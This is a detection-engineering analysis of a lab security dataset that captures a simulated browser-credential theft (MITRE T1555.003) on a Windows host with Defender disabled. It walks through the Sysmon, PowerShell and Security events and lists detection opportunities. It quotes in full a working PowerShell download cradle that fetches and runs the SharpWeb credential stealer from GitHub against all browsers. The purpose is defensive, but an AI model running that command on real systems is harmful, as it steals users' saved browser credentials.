# T1555.003-13: Credentials from Web Browsers — WinPwn - PowerSharpPack - Sharpweb for Browser Credentials

## Technique Context

MITRE ATT&CK T1555.003 (Credentials from Web Browsers) includes download-and-execute patterns for .NET-based browser credential stealers. SharpWeb is a C# tool that extracts saved credentials from Chrome, Firefox, Opera, and Edge by accessing their respective credential stores. PowerSharpPack is a repository by S3cur3Th1sSh1t that packages compiled .NET offensive tools as PowerShell-invokable binaries. `Invoke-Sharpweb` loads the SharpWeb assembly reflectively from a base64-encoded blob — a technique designed to avoid writing a binary to disk and to bypass signature-based detection on the binary itself.

With Defender disabled, `Invoke-Sharpweb` can download the PowerSharpPack module, reflectively load the SharpWeb .NET assembly, and query browser credential stores without AMSI interception.

## What This Dataset Contains

This dataset was captured on ACME-WS06 (Windows 11 Enterprise, domain acme.local) on 2026-03-17 with Defender disabled, spanning approximately 10 seconds. It contains 158 events across four channels: 39 Sysmon, 114 PowerShell, 4 Security, and 1 Application.

**Command executed (Sysmon EID=1 and Security EID=4688):**
```
"powershell.exe" & {iex(new-object net.webclient).downloadstring(
  'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command "all"}
```
The full command line appears verbatim in both Security EID=4688 and Sysmon EID=1. The `-command "all"` argument instructs SharpWeb to target all supported browsers simultaneously. The process ran as `NT AUTHORITY\SYSTEM`, IntegrityLevel: System, from `C:\Windows\TEMP\`.

**PowerShell script block logging (EID=4104):** 111 script block events capturing the download cradle invocation, `Invoke-Sharpweb -command "all"`, and PowerSharpPack's internal code as it was evaluated by the PowerShell engine.

**Sysmon EID=22 (DNS Query):** DNS query for `raw.githubusercontent.com` confirming the download request was initiated and resolved to the GitHub CDN.

**Sysmon EID=10 (Process Access):** Four EID=10 events showing `powershell.exe` accessing child processes at `GrantedAccess: 0x1FFFFF`, tagged `technique_id=T1055.001`. The access pattern reflects the ART test framework's standard cross-process management of child PowerShell instances.

**Sysmon EID=1 (Process Create):** Four process creations including `whoami.exe` (tagged T1033) and the child `powershell.exe` executing the download cradle (tagged T1059.001).

**Sysmon EID=17 (Pipe Created):** Three named pipe creations: `\PSHost.*` pipes from PowerShell instances — standard console host infrastructure.

**Security EID=4688:** Four process creation events (SYSTEM context) capturing `whoami.exe` and the full PowerSharpPack invocation in the command line.

**Application EID=15:** SecurityCenter reporting `SECURITY_PRODUCT_STATE_ON` for Windows Defender — a passive-mode status update generated even with Defender's real-time protection disabled.

Note: The EID breakdown shows EID=3 (network connection) and EID=11 (file created) each appearing once in the full dataset, though they fall outside the sample window. The EID=3 event represents the outbound download to GitHub, and EID=11 reflects a PowerShell profile artifact.

## What This Dataset Does Not Contain

**SharpWeb credential output.** SharpWeb accesses browser SQLite databases and Windows DPAPI blobs. No credential dump output file appears in EID=11 events. The SYSTEM account context limits SharpWeb's reach — browser credentials are stored per user under `%LOCALAPPDATA%` and `%APPDATA%`, neither of which maps to meaningful content under the SYSTEM account profile.

**Reflective .NET assembly image load.** `Invoke-Sharpweb` loads SharpWeb in-memory via `[System.Reflection.Assembly]::Load()`. The SharpWeb assembly does not appear as a named DLL in EID=7 events — reflective loading bypasses the named-image load path that Sysmon monitors.

**Sysmon EID=3 for the PowerShell download connection.** The EID=3 event is present in the full dataset but not in the 20-event sample. The DNS query (EID=22) confirms the resolution, and the full dataset's event count confirms the network connection occurred.

**Comparison with the defended variant:** In the defended dataset (sysmon: 28, security: 10, powershell: 51), AMSI blocked the PowerSharpPack payload before the assembly loader could run. The PowerShell event count there was 51 — near-exclusively boilerplate. Here, 114 events appear, including the full Invoke-Sharpweb invocation and PowerSharpPack's assembly loading logic. The undefended run provides 2.2x the PowerShell logging volume of the defended run, with technique-relevant content that was absent in the defended dataset.

## Assessment

This dataset offers significantly richer content than its defended counterpart. The full `Invoke-Sharpweb -command "all"` invocation is preserved in EID=4104, along with the download URL and the internal PowerSharpPack function evaluation chain. The DNS query to `raw.githubusercontent.com` and the outbound network connection to GitHub CDN are present.

The primary limitation is that browser credential access did not succeed under the SYSTEM account context — no credential dump output is visible in file creation events. This is a constraint of the test environment, not a detection gap. For analysts building detection content against SharpWeb and PowerSharpPack, the PowerShell script block content and the download cradle pattern are the primary data this dataset provides.

## Detection Opportunities Present in This Data

**PowerShell EID=4104 — download cradle followed by Invoke-Sharpweb:** The pattern `iex(new-object net.webclient).downloadstring(...)` combined with `Invoke-Sharpweb -command "all"` in the same script block is a specific, high-confidence indicator.

**Sysmon EID=22 — PowerShell DNS query for raw.githubusercontent.com:** Combined with subsequent script block content referencing offensive tools, this DNS pattern warrants investigation.

**Sysmon EID=3 — outbound HTTPS from powershell.exe to GitHub CDN:** An outbound connection from PowerShell to raw.githubusercontent.com during a credential-access activity is a strong behavioral signal.

**PowerShell EID=4104 — reflective assembly loading pattern:** If SharpWeb's assembly loader generates distinctive script block fragments (e.g., `[System.Reflection.Assembly]::Load(` with a base64 blob), those fragments are present in the 111 EID=4104 events and provide a content-based detection anchor.

**Sysmon EID=1 — PowerShell child of PowerShell with download cradle:** The parent-child PowerShell lineage combined with a `net.webclient downloadstring` command line is a consistent, detectable pattern.
